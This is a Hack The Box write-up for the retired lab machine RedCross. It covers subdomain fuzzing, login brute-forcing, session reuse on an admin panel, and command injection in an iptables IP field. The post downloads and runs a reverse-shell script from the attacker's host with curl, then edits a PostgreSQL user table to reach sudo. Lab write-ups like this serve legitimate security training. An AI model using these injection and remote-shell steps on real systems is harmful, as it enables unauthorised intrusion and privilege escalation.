---
layout: post
title: Hack The Box - RedCross
categories: hack-the-box
image: /hackthebox/redcross/0.png
---
<hr>
### Quick Summary
#### Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as `www-data` , then escalate to root. The second way is to exploit a vulnerable `smtp` server called `Haraka` to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It's a medium-rated linux box and its ip is `10.10.10.113` I added it to `/etc/hosts` as `redcross.htb`. Let's jump right in !
![](/images/hackthebox/redcross/0.png)
<hr>
### Nmap
#### As always we will start with nmap to scan for open ports and services : 
`nmap -sV -sT -sC redcross.htb`
![](/images/hackthebox/redcross/1.png)
#### Port 22 is open and running ssh , there's http and https on ports 80 and 443. As always we will check http.
<br>
<hr>
### HTTP Initial Enumeration
#### By going to `http://redcross.htb` it redirects us to `https://intra.redcross.htb`
![](/images/hackthebox/redcross/2.png)
#### I added `intra.redcross.htb` to `/etc/hosts` next to the ip of the box which is `10.10.10.113`
![](/images/hackthebox/redcross/3.png)
#### Let's go to `intra.redcross.htb` again : 
![](/images/hackthebox/redcross/4.png)
#### Before doing anything I wanted to see if there are any other subdomains , so I used `wfuzz` with [subdomains-top1mil-5000.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt) from seclists : 
`wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb`
![](/images/hackthebox/redcross/5.png)
#### Responses for non-existing subdomains are 28 words so I stopped the scan to add `--hw 28` to filter these responses :
`wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb`
![](/images/hackthebox/redcross/6.png)
#### And we got `admin.redcross.htb` , So I added it to `/etc/hosts` :
![](/images/hackthebox/redcross/7.png)
#### Note : to enumerate every subdoamin there has to be an entry for that subdomain in `/etc/hosts` that points to the ip of the box , that's why I added the `HOST` HTTP header (`-H "HOST:FUZZ.redcross.htb"`) , it solves the problem.
#### Now let's go to `admin.redcross.htb` and see what's there :
![](/images/hackthebox/redcross/8.png)
#### It asks for login , we will get into this later but let's go back to `intra.redcross.htb` and see what can we do from there.
![](/images/hackthebox/redcross/4.png)
#### We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with `burp` to see the parameters :
![](/images/hackthebox/redcross/9.png)
#### Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like `admin:admin`, [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) from seclists.
`wfuzz -c --hh 11 -u "https://intra.redcross.htb/pages/actions.php" -X POST -d "user=FUZZ&pass=FUZZ&action=login" -w top-usernames-shortlist.txt`
![](/images/hackthebox/redcross/10.png)
#### `guest:guest` gave us a different response. Let's try it :
![](/images/hackthebox/redcross/11.png)
#### And it worked. And we see this message :
```
From: admin (uid 1)	To: guest (uid 5)

You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.

```
<br>
<hr>
### Broken Session Management , Admin Panel
#### After some enumeration I found that after being authenticated as `guest` on `intra.redcross.htb` you can use the session id on `admin.redcross.htb` and it will work :
![](/images/hackthebox/redcross/12.png)
<br>
<br>
![](/images/hackthebox/redcross/13.png)
<br>
<br>
![](/images/hackthebox/redcross/14.png)
#### Now we have access to the admin panel , there are two areas : `User Management` and `Network Access`
#### `User Management` :
![](/images/hackthebox/redcross/15.png)
#### Can we really add users ? Let's try `test` :
![](/images/hackthebox/redcross/16.png)
<br>
<br>
![](/images/hackthebox/redcross/17.png)
#### Nice it gave us the credentials , let's try ssh : 
![](/images/hackthebox/redcross/18.png)
#### And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let's look at `/home` :
![](/images/hackthebox/redcross/19.png)
#### `interface_data` and `public` ? Last thing I checked was `/etc/passwd` to know any possible user :
![](/images/hackthebox/redcross/20.png)
#### There's a user called `penelope` , but no `/home` directory for `penelope`. So I gave up on this and looked at `Network Access` :
![](/images/hackthebox/redcross/21.png)
#### I added my ip address to the whitelist:
![](/images/hackthebox/redcross/22.png)
#### Then I scanned the box with nmap again to see if some new ports show up :
![](/images/hackthebox/redcross/59.png)
<br>
<br>
![](/images/hackthebox/redcross/60.png)
#### there's ftp on port 21 (anonymous login not allowed), `postgresql SQL database` on port 5432 and a service on port 1025 but nmap couldn't really identify it. Now there are two ways to continue , I will show the RCE first.
<br>
<hr>
### RCE on `admin.redcross.htb` , Reverse Shell as `www-data`
#### On the `Network Access` Section you can add and remove ips from the whitelist , I added a random ip , let's say `11.11.11.11` and intercepted the two requests with `burp` :
![](/images/hackthebox/redcross/23.png)
#### Allow request :
![](/images/hackthebox/redcross/24.png)
#### Response :
![](/images/hackthebox/redcross/25.png)
#### Deny request :
![](/images/hackthebox/redcross/26.png)
#### Response :
![](/images/hackthebox/redcross/27.png)
#### We notice that it's saying `Executing iptables` , so the ip we provide will be a part of a system command. I added `|ls` to the ip parameter in the deny request and got this response :
![](/images/hackthebox/redcross/28.png)
<br>
<br>
![](/images/hackthebox/redcross/29.png)
#### Nice we have an RCE , let's get a reverse shell , I created a reverse shell and called it `shell.sh` :
![](/images/hackthebox/redcross/30.png)
#### Then I hosted it on a python simple HTTP server , and downloaded it on the box : `curl http://10.10.xx.xx/shell.sh > /tmp/shell.sh`
![](/images/hackthebox/redcross/31.png)
#### Python Server :
![](/images/hackthebox/redcross/32.png)
#### Let's verify that the shell is on the box :
![](/images/hackthebox/redcross/33.png)
<br>
<br>
![](/images/hackthebox/redcross/34.png)
#### Nice let's execute :
`bash /tmp/shell.sh`
![](/images/hackthebox/redcross/35.png)
<br>
<br>
![](/images/hackthebox/redcross/36.png)
#### We got a shell as `www-data` :
![](/images/hackthebox/redcross/37.png)
#### And we see in `/home` a directory for `penelope` , but we can't read the user flag.
![](/images/hackthebox/redcross/38.png)
<hr>
### Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root
#### In the root directory of the web application , there's an interseting `php` file called `actions.php`. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called `unixusrmgr` :
![](/images/hackthebox/redcross/40.png)
```
if($action==='del'){
        header('refresh:1;url=/?page=users');
        $uid=$_POST['uid'];
        $dbconn = pg_connect("host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
        $result = pg_prepare($dbconn, "q1", "delete from passwd_table where uid = $1");
        $result = pg_execute($dbconn, "q1", array($uid));
        echo "User account deleted";
}
```
#### We knew earlier that the database is `PostgreSQL` , let's connect :
#### Some Cheatcheets for `PostgreSQL` : 
#### [Github](https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546)
#### [postgresqltutorial.com](http://www.postgresqltutorial.com/postgresql-cheat-sheet/)
`psql -h 127.0.0.1 -d unix -U unixusrmgr`
![](/images/hackthebox/redcross/41.png)
#### `\dt` to list the tables :
![](/images/hackthebox/redcross/42.png)
#### I did `select * from passwd_table;` and got some users with their password hashes and other info , so I went back to the admin panel and added a user called `rick` :
![](/images/hackthebox/redcross/43.png)
#### Then I did `select * from passwd_table;` again :
![](/images/hackthebox/redcross/44.png)
#### We notice that the `homedir` is set to `/var/jail/home` that's why we can't access the actual host with created users. Also the `gid` is set to `1001`. Let's set that to `0` (root) :
`update passwd_table set gid=0 where gid=1001;`
![](/images/hackthebox/redcross/45.png)
#### Now the `gid` is `0` : 
![](/images/hackthebox/redcross/46.png)
#### Let's also change the `homedir` :
`update passwd_table set homedir='/home' where homedir='/var/jail/home';`
![](/images/hackthebox/redcross/47.png)
<br>
<br>
![](/images/hackthebox/redcross/48.png)
#### Let's login with ssh again :
![](/images/hackthebox/redcross/49.png)
#### by checking our `gid` : 
![](/images/hackthebox/redcross/50.png)
#### It's `root` , we still can't read the flags :
![](/images/hackthebox/redcross/51.png)
#### We can't also `sudo` :
![](/images/hackthebox/redcross/52.png)
#### Weird , I checked `/etc/sudoers` and saw this line :
![](/images/hackthebox/redcross/53.png)
#### If we got the `gid` of the group `sudo` , we will be able to run sudo. 
`cat /etc/group | grep sudo`
![](/images/hackthebox/redcross/54.png)
#### The `gid` is `27` , let's return to the database and change our `gid` from `0` to `27` :
`update passwd_table set gid=27 where gid=0;`
![](/images/hackthebox/redcross/55.png)
<br>
`select * from passwd_table;`
![](/images/hackthebox/redcross/56.png)
#### Great , let's terminate our ssh connection and login again. We are now a member of `sudo` and we can run `sudo` , so `sudo su` will give us a root shell.
![](/images/hackthebox/redcross/57.png)
#### Let's read the user flag :
![](/images/hackthebox/redcross/58.png)
#### Before reading the root flag let's see how can we actually get a user shell as `penelope`
<br>
<hr>
### Vulnerable SMTP Server (Haraka)
#### Back to the admin panel , after whitelisting the ip and doing a second nmap scan :
![](/images/hackthebox/redcross/59.png)
<br>
<br>
![](/images/hackthebox/redcross/60.png)
#### Port 1025 was open and nmap couldn't identify it. I tried several ways to connect to that port, `nc` , `telnet` , `ftp` etc...
#### Fortunately `ftp` gave me this banner :
![](/images/hackthebox/redcross/61.png)
#### That version of the `SMTP` server is vulnerable to a command injection and there's a metasploit module for it :
![](/images/hackthebox/redcross/62.png)
<br>
<br>
![](/images/hackthebox/redcross/63.png)
#### That's how to get a shell on the box without the RCE in the web application.
#### We can get a shell by typing `shell` , and we are `penelope` so we can read the user flag :
![](/images/hackthebox/redcross/64.png)
#### After that we will do the same thing we did with the database and users. We already did it so we won't do it again. Back to our ssh connection let's read the root flag :
![](/images/hackthebox/redcross/65.png)
#### And we owned root !
<br>
<br>
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - Vault](/hack-the-box/vault/)
<hr>
